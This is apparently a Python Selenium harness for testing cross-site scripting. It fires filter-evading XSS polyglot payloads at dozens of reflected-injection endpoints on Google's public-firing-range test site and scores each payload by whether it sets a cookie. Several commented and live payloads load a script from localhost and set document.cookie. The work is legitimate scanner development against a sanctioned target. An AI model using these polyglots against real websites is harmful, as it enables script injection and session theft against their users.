import requests
import numpy as np
import random
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

caps = DesiredCapabilities().CHROME
caps["pageLoadStrategy"] = "none"

# Set up Selenium WebDriver in headless mode
options = webdriver.ChromeOptions()
options.add_argument("--headless")
service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service, options=options)

# List of endpoints for testing
endpoints = [
    "https://public-firing-range.appspot.com/reflected/parameter/body?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/head?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/title?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/body_comment?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/tagname?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/attribute_unquoted?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/attribute_singlequoted?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/attribute_quoted?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/attribute_name?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/body/400?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/body/401?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/body/403?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/body/404?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/body/500?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/iframe_attribute_value?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/iframe_srcdoc?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/textarea?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/textarea_attribute_value?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/noscript?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/style_attribute_value?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/css_style?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/css_style_value?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/css_style_font_value?q=",
    # "https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE?q=",     # just xss
    # "https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE?q=",  # no solution
    # "https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE?q=",  # no solution
    "https://public-firing-range.appspot.com/reflected/parameter/js_assignment?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/js_eval?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/js_quoted_string?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/js_singlequoted_string?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/js_slashquoted_string?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/js_comment?q=",
    "https://public-firing-range.appspot.com/reflected/parameter/attribute_script?q=",
    # "https://public-firing-range.appspot.com/reflected/url/href?q=",  # just link
    # "https://public-firing-range.appspot.com/reflected/url/css_import?q=",  # just link
    # "https://public-firing-range.appspot.com/reflected/url/script_src?q=",  # just link
    # "https://public-firing-range.appspot.com/reflected/url/object_data?q=", # adobe
    # "https://public-firing-range.appspot.com/reflected/url/object_param?q=", # adobe

    # form
    "https://public-firing-range.appspot.com/reflected/parameter/form",
    "https://public-firing-range.appspot.com/reflected/filteredcharsets/body/SpaceDoubleQuoteSlashEquals?q=",
    "https://public-firing-range.appspot.com/reflected/filteredcharsets/attribute_unquoted/DoubleQuoteSinglequote?q=",
    "https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/script?q=",
    "https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/SCRIPT?q=",
    "https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseInsensitive/script?q=",



    ## tag
    "https://public-firing-range.appspot.com/tags/tag?q=",
    # "https://public-firing-range.appspot.com/tags/tag/meta?q=",  # meta
    # "https://public-firing-range.appspot.com/tags/tag/div?q=",  # div
    "https://public-firing-range.appspot.com/tags/tag/img?q=",
    "https://public-firing-range.appspot.com/tags/tag/style?q=",  # style
    "https://public-firing-range.appspot.com/tags/tag/iframe?q=",
    # "https://public-firing-range.appspot.com/tags/tag/div/style?q=",  # div
    "https://public-firing-range.appspot.com/tags/tag/a/href?q=",  # a
    "https://public-firing-range.appspot.com/tags/tag/a/style?q=",  # style
    "https://public-firing-range.appspot.com/tags/tag/script/src?q=",
    "https://public-firing-range.appspot.com/tags/tag/body/onload?q=",

    "https://public-firing-range.appspot.com/tags/expression?q=",
    "https://public-firing-range.appspot.com/tags/multiline?q=",  # no solution

    # escape
    # "https://public-firing-range.appspot.com/escape/serverside/escapeHtml/body?q=", # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/encodeUrl/body?q=",  # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/escapeHtml/head?q=", # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/encodeUrl/head?q=",  # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/escapeHtml/body_comment?q=", # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/encodeUrl/body_comment?q=",  # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/escapeHtml/textarea?q=",  # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/encodeUrl/textarea?q=",   # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/escapeHtml/tagname?q=",   # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/encodeUrl/tagname?q=",    # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_unquoted?q=", # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_unquoted?q=",  # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_quoted?q=", # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_quoted?q=", # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_name?q=", # no solution
    # "https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_name?q=", # no solution
    "https://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_import?q=",
    "https://public-firing-range.appspot.com/escape/js/escape?q=",
    "https://public-firing-range.appspot.com/escape/js/encodeURIComponent?q=",
    "https://public-firing-range.appspot.com/escape/js/html_escape?q=",

]

# Evaluation function
def evaluate_xss_payload(payload):
    payload_str = ''.join(payload)
    score_vector = np.zeros(len(endpoints))
    for i, endpoint in enumerate(endpoints):
        test_url = f"{endpoint}{payload_str}"
        try:
            driver.get(test_url)
            # for k in driver.get_log('browser'):
            #     if (k['level'] == 'SEVERE') or (k['message'].startswith('Uncaught')):
            #         print(k)
            if driver.get_cookies():
                score_vector[i] = 1
                driver.delete_all_cookies()
            print(f"test_url: {test_url} \nscore: {score_vector[i]}\n")
        except Exception as e:
            print(f"Error testing {endpoint}: {e}")
    total_score = np.sum(score_vector)
    print(score_vector, "\n", payload_str)
    print(total_score, "/", len(endpoints))
    return total_score, score_vector

# xss_payload = """<svg</noScRIpt><ScRiPt>document.cookie=1</ScRiPt><ScRiPt sRc='https://localhost:8080/xss.js'></ScRiPt></nOeMbed> oNeRrOr='document.cookie=1''</hTmL>} sRc=</StYle>*/</teMplAte></ifRaMe>--!>*/;</texTarEa></tITle><iMg SrC OneRror='document.cookie=1'>" oNeRrOr='document.cookie=1'/ oNLoAd='document.cookie=1' """
# xss_payload = """
# <IfRame</tITle><ScRiPt sRc="http://localhost:8080/xss.js"></ScRiPt>iMg SrC="http://localhost:8080/xss.js" OneRror="document.cookie=1")sCrIpTscript</nOeMbed></tITle></StYle></noScRIpt></teMplAte></ifRaMe>dIv"</texTarEa><ScRiPt sRc="http://localhost:8080/xss.js"></ScRiPt>*/</iNpUt>'*/iMg SrC="http://localhost:8080/xss.js" OneRror="document.cookie=1"<iframe%3C<img%26%2339;\x20</frAmEsEt>--!>[*http://localhost:8080/xss.js<iMg SrC='http://localhost:8080/xss.js' OneRror='document.cookie=1'>
# """

xss_payload = """jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk='document.cookie=1' )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd='document.cookie=1'//>\x3e
# """



evaluate_xss_payload(xss_payload)

driver.quit()